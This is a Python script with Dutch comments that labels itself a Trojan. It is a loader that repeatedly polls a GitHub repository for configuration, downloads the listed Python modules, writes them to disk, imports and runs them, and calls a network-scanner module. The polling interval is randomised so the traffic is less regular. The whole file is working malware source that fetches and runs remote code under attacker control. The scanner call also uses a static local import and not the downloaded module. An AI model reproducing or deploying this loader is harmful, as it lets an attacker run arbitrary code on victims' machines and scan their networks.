import time
import requests
import random
import importlib
import json
from pathlib import Path
from modules.netwerk_scanner import run as netwerk_scanner_run  # Import de run functie van de netwerkscanner

def fetch_configuration():
    """Haalt de configuratie op van de GitHub repository."""
    print("--- Configuratie ophalen ---")
    url = "https://raw.githubusercontent.com/canuski/Trojan/main/config/config.json"
    response = requests.get(url)
    if response.status_code == 200:
        print("Configuratie succesvol opgehaald.")
        return response.json()
    else:
        print(f"Fout bij ophalen configuratie: {response.status_code}")
        return None

def fetch_and_run_module(module_name):
    """Laadt en voert de module uit."""
    print(f"Bezig met module: {module_name}")
    
    # Dynamisch laden van de module
    module_url = f"https://raw.githubusercontent.com/canuski/Trojan/main/modules/{module_name}.py"
    response = requests.get(module_url)
    
    if response.status_code == 200:
        # Sla de module tijdelijk op in de directory
        module_path = Path(f"modules_temp/{module_name}.py")
        module_path.parent.mkdir(parents=True, exist_ok=True)
        with open(module_path, "w") as file:
            file.write(response.text)

        # Importeer de module via importlib
        importlib.import_module(f"modules_temp.{module_name}")
        print(f"Module {module_name} succesvol geladen.")

        # Run de module
        if module_name == "netwerk_scanner":
            netwerk_scanner_run()
    else:
        print(f"Fout bij ophalen module {module_name}: {response.status_code}")

def main():
    print("Start Trojan...")

    while True:
        print("\n--- Nieuwe cyclus gestart ---")

        # Stap 1: Haal configuratie op van GitHub
        config = fetch_configuration()
        if not config:
            print("Fout bij het ophalen van configuratie, wacht 10 seconden...")
            time.sleep(10)
            continue

        # Stap 2: Haal modules op en voer uit
        modules = config.get("modules", [])
        poll_frequency = config.get("poll_frequency", 60)
        print(f"Gevonden modules: {modules}")
        print(f"Pollfrequentie: {poll_frequency} seconden")

        for module in modules:
            fetch_and_run_module(module)

        # Wacht voor de volgende cyclus
        wait_time = random.uniform(poll_frequency * 0.8, poll_frequency * 1.2)
        print(f"Wachten voor {wait_time:.2f} seconden...")
        time.sleep(wait_time)

if __name__ == "__main__":
    main()
